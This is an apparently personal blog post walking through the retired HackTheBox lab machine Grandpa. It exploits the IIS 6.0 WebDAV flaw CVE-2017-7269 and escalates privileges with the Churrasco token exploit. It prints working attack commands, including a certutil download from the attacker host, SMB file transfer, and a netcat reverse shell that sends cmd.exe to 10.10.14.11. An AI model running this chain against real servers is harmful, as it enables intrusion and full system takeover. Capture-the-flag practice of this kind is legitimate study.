<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
    <style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                    <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                HacktheBox: Grandpa
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                Jan 2, 2021
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">Grandpa</a></li>
        </ul>
      </nav>
<p>Practing retired hackthebox machines. Had trouble with this one, knew what I had to do, but didn't know how to do it. Need to practice more Windows machines.</p>
<h3>Scanning:</h3>
<ul>
<li>Find running services:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ nmap -PS 10.10.10.14
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-02 11:09 EST
Nmap scan report for 10.10.10.14
Host is up (0.034s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
</span></code></pre>
<ul>
<li>Find more information about services (ie. versions, etc.)</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ sudo nmap -sV 10.10.10.14
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
</span></code></pre>
<h3>Web:</h3>
<p>Index Page:</p>
<img src="images/gr1.png">
<h5>Getting Server Version Info:</h5>
<pre><code><span>crazyeights@es-base:~$ nikto -h http://10.10.10.14
- Nikto v2.1.6
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
[SNIP]
+ WebDAV enabled (PROPFIND COPY PROPPATCH UNLOCK LOCK SEARCH MKCOL listed as allowed)
[SNIP]
</span></code></pre>
<ul>
<li>Many different potential vulnerabilities were listed by nikto</li>
<li>We know the version of Microsoft-IIS is vulnerable, we must find an exploit</li>
</ul>
<h5>Searching for exploits:</h5>
<ul>
<li>Using searchsploit:</li>
</ul>
<pre><code><span>Microsoft IIS 6.0 - WebDAV 'ScStoragePathFrom | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authenticat | windows/remote/8806.pl
</span></code></pre>
<h4>This is the only one that fits:</h4>
<pre><code><span>crazyeights@es-base:~$ searchsploit -x windows/remote/41738.py
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
</span></code></pre>
<ul>
<li>The exploitdb script does not work here. There are many version of this exploit available.</li>
</ul>
<h5>The only working version of the exploit:</h5>
<ul>
<li>Found by googling CVE-2017-7269 reverse shell</li>
</ul>
<pre><code><span>https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
</span></code></pre>
<ul>
<li>Download the exploit</li>
<li>Start the listener:</li>
</ul>
<pre><code><span>nc -lvp 1234
</span></code></pre>
<h5>Run the exploit:</h5>
<ul>
<li>Command is in the format: <code><span>python [exploit] [VICTIM IP] [PORT] [ATTACKER IP] [LISTENER PORT]</code></li>
</ul>
<pre><code><span>crazyeights@es-base:~$ python iis_webdav_20177269.py 10.10.10.14 80 10.10.14.11 1234
</span></code></pre>
<img src="images/gr2.png">
<h3>User:</h3>
<ul>
<li>You get a shell with limited privileges:</li>
</ul>
<pre><code><span>c:\windows\system32\inetsrv&gt;whoami
whoami
nt authority\network service
</span></code></pre>
<ul>
<li>Get OS info</li>
</ul>
<pre><code><span>C:\&gt;systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
[SNIP]
</span></code></pre>
<ul>
<li>Looking around:</li>
</ul>
<pre><code><span>C:\&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\

04/12/2017  04:27 PM    &lt;DIR&gt;          ADFS
04/12/2017  04:04 PM                 0 AUTOEXEC.BAT
04/12/2017  04:04 PM                 0 CONFIG.SYS
04/12/2017  04:32 PM    &lt;DIR&gt;          Documents and Settings
04/12/2017  04:17 PM    &lt;DIR&gt;          FPSE_search
04/12/2017  04:17 PM    &lt;DIR&gt;          Inetpub
12/24/2017  07:18 PM    &lt;DIR&gt;          Program Files
12/24/2017  07:27 PM    &lt;DIR&gt;          WINDOWS
04/12/2017  04:05 PM    &lt;DIR&gt;          wmpub
               2 File(s)              0 bytes
               7 Dir(s)  18,088,382,464 bytes free
</span></code></pre>
<ul>
<li>
<p>wmpub - directory user nt authority\network service can write to</p>
</li>
<li>
<p>Finding users:</p>
</li>
</ul>
<pre><code><span>C:\&gt;cd &quot;Documents and Settings&quot;
cd &quot;Documents and Settings&quot;

C:\Documents and Settings&gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\Documents and Settings

04/12/2017  04:32 PM    &lt;DIR&gt;          .
04/12/2017  04:32 PM    &lt;DIR&gt;          ..
04/12/2017  04:12 PM    &lt;DIR&gt;          Administrator
04/12/2017  04:03 PM    &lt;DIR&gt;          All Users
04/12/2017  04:32 PM    &lt;DIR&gt;          Harry
               0 File(s)              0 bytes
               5 Dir(s)  18,088,439,808 bytes free

C:\Documents and Settings&gt;cd Harry
cd Harry
Access is denied.

C:\Documents and Settings&gt;cd Administrator
cd Administrator
Access is denied.

C:\Documents and Settings&gt;
</span></code></pre>
<p>There are two users:</p>
<ul>
<li>Harry</li>
<li>Administrator</li>
</ul>
<h5>Looking for exploits:</h5>
<ul>
<li>We have the server version, and it old enough that there is definitely privilege escalation exploits for it</li>
<li>Using searchsploit:</li>
</ul>
<pre><code><span>Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                                                                | windows/local/6705.txt
Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                                                                  | windows/local/35936.py

</span></code></pre>
<p>This one must be correct - because OS version is not SP2</p>
<pre><code><span>crazyeights@es-base:~$ searchsploit -x windows/local/6705.txt
  Exploit: Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
</span></code></pre>
<p>Exploit steps:</p>
<ul>
<li>download the exploit executable on to the remote machine</li>
<li>download netcat to get a reverse shell with elevated privileges</li>
<li>Start a listener and run the exploit with the command nc to be run with elevated privileges</li>
<li>Connect and download the flags</li>
</ul>
<p>Found the executable for the exploit here:</p>
<pre><code><span>https://github.com/Re4son/Churrasco/
</span></code></pre>
<p>Found the netcat executable for windows here:</p>
<pre><code><span>https://eternallybored.org/misc/netcat/
</span></code></pre>
<ul>
<li>Use the 32-bit version</li>
</ul>
<p>Tried to use a webserver to transfer the exploit the target, didn't work:</p>
<ul>
<li>Put the exe on apache server:</li>
</ul>
<pre><code><span>crazyeights@es-base:~$ sudo cp Downloads/Churrasco-master/churrasco.exe /var/www/html/
[sudo] password for crazyeights: 
crazyeights@es-base:~$ sudo service apache2 start

</span></code></pre>
<ul>
<li>Try to download exec from the server:</li>
</ul>
<pre><code><span>certutil.exe -UrlCache -split -f &quot;http://10.10.14.11/churrasco.exe&quot; bad.exe
</span></code></pre>
<ul>
<li>Got stuck...</li>
<li>Used the same method as: <a href="https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html">https://0xdf.gitlab.io/2020/05/28/htb-grandpa.html</a></li>
<li>Didn't know you could do this</li>
<li>Use SMB server from impacket to make files available to remote machine</li>
</ul>
<h5>Start the server:</h5>
<pre><code><span>crazyeights@es-base:~/tools/impacket/examples$ sudo python3 smbserver.py share /home/
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</span></code></pre>
<h5>Download the files from the SMB server:</h5>
<ul>
<li>Download the churrasco exploit:</li>
</ul>
<pre><code><span>C:\wmpub&gt;copy \\10.10.14.11\share\churrasco.exe bad.exe
copy \\10.10.14.11\share\churrasco.exe bad.exe
        1 file(s) copied.
</span></code></pre>
<ul>
<li>Download 32-bit netcat executable:</li>
</ul>
<pre><code><span>C:\wmpub&gt;copy \\10.10.14.11\share\nc.exe nc32.exe
copy \\10.10.14.11\share\nc.exe nc32.exe
        1 file(s) copied.
</span></code></pre>
<h6>Start the listener on your machine:</h6>
<pre><code><span>nc -lvp 9999
</span></code></pre>
<h6>Run the exploit:</h6>
<ul>
<li>I had to run it multiple times because it disconnected after a certain amount of time</li>
</ul>
<pre><code><span>C:\wmpub&gt;.\bad.exe -d &quot;C:\wmpub\nc32.exe -e cmd.exe 10.10.14.11 9999&quot;             
.\bad.exe -d &quot;C:\wmpub\nc32.exe -e cmd.exe 10.10.14.11 9999&quot;
/churrasco/--&gt;Current User: NETWORK SERVICE 
/churrasco/--&gt;Getting Rpcss PID ...
/churrasco/--&gt;Found Rpcss PID: 680 
/churrasco/--&gt;Searching for Rpcss threads ...
/churrasco/--&gt;Found Thread: 684 
/churrasco/--&gt;Thread not impersonating, looking for another thread...
/churrasco/--&gt;Found Thread: 688 
/churrasco/--&gt;Thread not impersonating, looking for another thread...
/churrasco/--&gt;Found Thread: 696 
/churrasco/--&gt;Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/--&gt;Getting SYSTEM token from Rpcss Service...
/churrasco/--&gt;Found SYSTEM token 0x728
/churrasco/--&gt;Running command with SYSTEM Token...
/churrasco/--&gt;Done, command should have ran as SYSTEM!
</span></code></pre>
<h5>Get user flag:</h5>
<pre><code><span>C:\WINDOWS\TEMP&gt;type &quot;C:\Documents and Settings\Harry\Desktop\user.txt&quot;
type &quot;C:\Documents and Settings\Harry\Desktop\user.txt&quot;
bdff5_i_dont_want_to_get_in_trouble

</span></code></pre>
<h3>Root:</h3>
<h5>Get root flag:</h5>
<pre><code><span>C:\WINDOWS\TEMP&gt;type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
9359e_i_dont_want_to_get_in_trouble
C:\WINDOWS\TEMP&gt;
</span></code></pre>
<p>FIN. 🥳</p>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>